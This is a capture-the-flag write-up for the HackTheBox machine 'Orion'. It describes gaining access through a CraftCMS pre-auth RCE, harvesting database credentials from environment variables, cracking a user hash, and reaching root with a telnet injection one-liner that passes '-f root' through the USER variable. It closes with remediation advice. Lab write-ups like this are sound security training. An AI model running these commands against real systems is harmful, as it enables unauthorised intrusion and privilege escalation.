---
title: "HackTheBox - Orion"
date: 2026-08-20 15:05:00 +0200
categories: [WriteUp]
tags: "WriteUp, HackTheBox, Linux, Easy"
image: /assets/images/HTB-Orion/Orion_Logo.png
---

Orion is a Linux box running the Orion Telecom website on CraftCMS. Initial access is gained through an unauthenticated pre-auth RCE in CraftCMS's asset transform generation feature (CVE-2025-32432), landing a shell as www-data. Database credentials leaked via environment variables give access to a cracked user hash, leading to SSH as adam. Privilege escalation abuses a vulnerable local telnet daemon (CVE-2026-24061) that passes an unsanitized USER variable to /usr/bin/login, allowing an authentication bypass straight to a root shell.

---


# 0. Description

**OS:** Linux

**Difficulty:** Easy

**Target IP:** 10.129.103.43

**Attacker environment:** Exegol


---


# 1. Reconnaissance

## 1.1 Host Discovery

```bash
echo "10.129.103.43 orion.htb" | sudo tee -a /etc/hosts
```

```bash
ping -c5 orion.htb
```

```
PING orion.htb (10.129.103.43) 56(84) bytes of data.
64 bytes from orion.htb (10.129.103.43): icmp_seq=1 ttl=63 time=82.3 ms
64 bytes from orion.htb (10.129.103.43): icmp_seq=2 ttl=63 time=71.2 ms
64 bytes from orion.htb (10.129.103.43): icmp_seq=3 ttl=63 time=71.3 ms
64 bytes from orion.htb (10.129.103.43): icmp_seq=4 ttl=63 time=66.9 ms
64 bytes from orion.htb (10.129.103.43): icmp_seq=5 ttl=63 time=43.1 ms

--- orion.htb ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 43.066/66.942/82.312/12.985 ms
```

A TTL of 63 confirms the target machine is running Linux.


## 1.2 Port scanning


```bash
nmap -sV -sC -O -T4 orion.htb -oN Nmap_Results.txt
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-20 16:04 CEST
Nmap scan report for orion.htb (10.129.103.43)
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Orion Telecom
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=8/20%OT=22%CT=1%CU=31739%PV=Y%DS=2%DC=I%G=Y%TM=6A8709A
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.50 seconds
```



## 1.3 Subdomain/Directory discovery

```bash
ffuf -c -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://orion.htb/FUZZ"
```
```bash

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://orion.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 733ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 197ms]
p2                      [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 277ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 65ms]
p1                      [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 92ms]
```


---


`/admin` is a login form for CraftCMS, version disclosed at the bottom of the page.

![image](/assets/images/HTB-Orion/login.png)

CraftCMS 5.6.16 is affected by **CVE-2025-32432**, a critical unauthenticated remote code execution vulnerability in the asset transform generation feature.




---


# 2. Foothold

A working Metasploit module exists for this CVE:

```
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit

meterpreter > getuid
Server username: www-data
```

---


# 3. Local enumeration

Stabilizing the shell:

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


```bash
www-data@orion:~/html/craft/web$ env
env
CRAFT_ENVIRONMENT=dev
CRAFT_DB_PORT=3306
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
PWD=/var/www/html/craft/web
PRIMARY_SITE_URL=http://orion.htb/
CRAFT_DB_DATABASE=orion
HOME=/var/www
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
USER=www-data
SHLVL=1
CRAFT_DB_USER=root
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DB_SCHEMA=
_=/usr/bin/env
```


Got MySQL creds for orion database : 
root:SuperSecureCraft123Pass! 
let's try them

```bash
mysql -h root -p orion
show table;
select * from users;
```

Recovering an email adress and a bcrypt password hash

| email          | password                                                     |
|----------------|---------------------------------------------------------------|
| adam@orion.htb | `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS` |


---


# 4. Lateral mouvement

## 4.1 Password cracking

```
hashcat -a 0 -m 3200 hash.txt rockyou.txt

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```


## 4.2 Authentication as Adam

```bash
ssh adam@10.129.103.43
Password : darkangel
```

```bash
adam@orion:~$ id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
adam@orion:~$ ls
user.txt
```

---


# 5. Privilege Escalation

## 5.1 Finding the local telnet service

```bash
adam@orion:~$ netstat -tulnp

tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                     
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

Port 23 is open on local host which indicates the presence of a telnet service

```bash
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
```

## 5.2 CVE-2026-24061

This version passes the client-supplied `USER` environment variable directly to `/usr/bin/login` without sanitization. An attacker can inject a `-f root` argument via the NEW_ENVIRON option to bypass authentication entirely and get an interactive root shell.



```
adam@orion:~$ USER='-f root' telnet -a 127.0.0.1

root@orion:~# whoami
root
root@orion:~# ls
root.txt  snap
root@orion:~# cat root.txt
```
---

![image](/assets/images/HTB-Orion/Pwned.png)

---


# 6. Attack Chain Recap

| # | Step | Detail |
|---|------|--------|
| 1 | CVE-2025-32432 | Unauthenticated pre-auth RCE in CraftCMS's asset transform generation feature, foothold as `www-data` |
| 2 | Credential leak | MySQL root credentials found in plaintext in the process environment |
| 3 | Hash extraction & cracking | Bcrypt hash for `adam` dumped from the `users` table, cracked with hashcat |
| 4 | Lateral movement | SSH as `adam` using the cracked password |
| 5 | CVE-2026-24061 | Local telnet daemon passes unsanitized `USER` to `/usr/bin/login`, allowing a `-f root` auth bypass |
| 6 | Root access | Interactive root shell via `USER='-f root' telnet -a 127.0.0.1` |

---

# 7. Remediation

- Patch CraftCMS beyond 5.6.16 to address CVE-2025-32432.
- Never store database credentials in plaintext environment variables readable by the web service user, use a secrets manager or restricted-permission config files.
- Enforce strong, unique passwords for CMS user accounts to resist offline cracking.
- Patch or remove the vulnerable GNU inetutils telnet daemon (CVE-2026-24061), telnet should not be running at all on a modern system and should be replaced with SSH.


---


# 8. Sources 

- [https://french.opswat.com/blog/cve-2025-32432-unauthenticated-remote-code-execution-in-craft-cms](https://french.opswat.com/blog/cve-2025-32432-unauthenticated-remote-code-execution-in-craft-cms)
- https://www.exploit-db.com/exploits/52525
- https://nvd.nist.gov/vuln/detail/CVE-2025-32432
- https://nvd.nist.gov/vuln/detail/cve-2026-24061
- https://www.offsec.com/blog/cve-2026-24061/
